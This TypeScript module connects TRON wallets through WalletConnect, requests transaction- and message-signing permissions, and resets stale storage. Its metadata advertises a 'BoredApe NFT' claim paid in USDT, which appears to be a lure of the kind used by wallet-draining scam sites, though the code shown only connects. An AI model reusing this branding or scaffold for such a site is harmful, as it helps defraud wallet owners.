import type { WalletConnectModal } from "@walletconnect/modal";
import { UniversalProvider } from "@walletconnect/universal-provider";

export const PROJECT_ID = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || "";

let provider: InstanceType<typeof UniversalProvider> | null = null;
let modal: WalletConnectModal | null = null;
let displayUriListenerAttached = false;

function attachProviderListeners(wcProvider: InstanceType<typeof UniversalProvider>) {
  if (displayUriListenerAttached) return;
  wcProvider.on("display_uri", (uri: string) => {
    if (modal) {
      modal.openModal({ uri });
    }
  });
  wcProvider.on("session_delete", () => {
    modal?.closeModal();
  });
  displayUriListenerAttached = true;
}

/**
 * Clear all WalletConnect-related data from localStorage.
 * This is the nuclear option to fix corrupt relay state ("tag:undefined" errors)
 * that persists across provider re-init because UniversalProvider.init() restores
 * stale pairings/sessions from storage.
 */
function clearWalletConnectStorage() {
  if (typeof window === "undefined") return;
  try {
    const keysToRemove: string[] = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key && (key.startsWith("wc@") || key.startsWith("walletconnect") || key.startsWith("WC_"))) {
        keysToRemove.push(key);
      }
    }
    keysToRemove.forEach((k) => localStorage.removeItem(k));
    if (keysToRemove.length > 0) {
      console.log("[WalletConnect] Cleared", keysToRemove.length, "stale storage entries");
    }
  } catch {
    // Ignore storage access errors
  }
}

/** Fully tear down the current provider and clear cached state. */
async function resetProvider() {
  if (provider) {
    try { await provider.disconnect(); } catch { /* ignore */ }
    provider = null;
  }
  displayUriListenerAttached = false;
  clearWalletConnectStorage();
}

export async function initWalletConnect() {
  if (provider) return provider;

  if (typeof window === "undefined") throw new Error("Browser only");

  if (!PROJECT_ID) throw new Error("Missing PROJECT_ID");

  try {
    provider = await UniversalProvider.init({
      projectId: PROJECT_ID,
      metadata: {
        name: "Ape NFT Claim",
        description: "Claim your exclusive BoredApe NFT with USDT",
        url: window.location.origin,
        icons: ["https://avatars.githubusercontent.com/u/37784886"],
      },
    });
  } catch (initError) {
    // If init fails (corrupt storage, relay issue), clear everything and retry once
    console.warn("[WalletConnect] init failed, resetting:", initError);
    clearWalletConnectStorage();
    provider = await UniversalProvider.init({
      projectId: PROJECT_ID,
      metadata: {
        name: "Ape NFT Claim",
        description: "Claim your exclusive BoredApe NFT with USDT",
        url: window.location.origin,
        icons: ["https://avatars.githubusercontent.com/u/37784886"],
      },
    });
  }

  if (!modal) {
    const { WalletConnectModal } = await import("@walletconnect/modal");
    modal = new WalletConnectModal({
      projectId: PROJECT_ID,
      themeMode: "dark",
      themeVariables: { "--wcm-z-index": "9999" },
      explorerRecommendedWalletIds: [
        "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
      ],
    });
  }

  attachProviderListeners(provider);

  return provider;
}

export async function connectWalletConnect() {
  // If there's a stale provider with no active session, tear it down
  // completely (including localStorage) to avoid "tag:undefined" errors.
  if (provider) {
    const hasActiveSession =
      provider.session?.topic &&
      (provider.session?.namespaces?.tron?.accounts ?? []).length > 0;
    if (!hasActiveSession) {
      await resetProvider();
    }
  }

  const wcProvider = await initWalletConnect();

  let session;
  try {
    session = await wcProvider.connect({
      optionalNamespaces: {
        tron: {
          chains: ["tron:0x2b6653dc"],
          methods: [
            "tron_signTransaction",
            "tron_signMessage",
            "tron_signMessageV2",
          ],
          events: ["chainChanged", "accountsChanged"],
        },
      },
    });
  } catch (error) {
    modal?.closeModal();
    // Connection failed — full reset so next attempt starts fresh
    await resetProvider();
    throw error;
  }

  modal?.closeModal();
  if (!session) throw new Error("Failed to connect wallet");

  console.log("Connected TRON session:", session.namespaces.tron);
  return wcProvider;
}


export async function disconnectWalletConnect() {
  await resetProvider();
}

export function getWalletConnectProvider() {
  return provider;
}
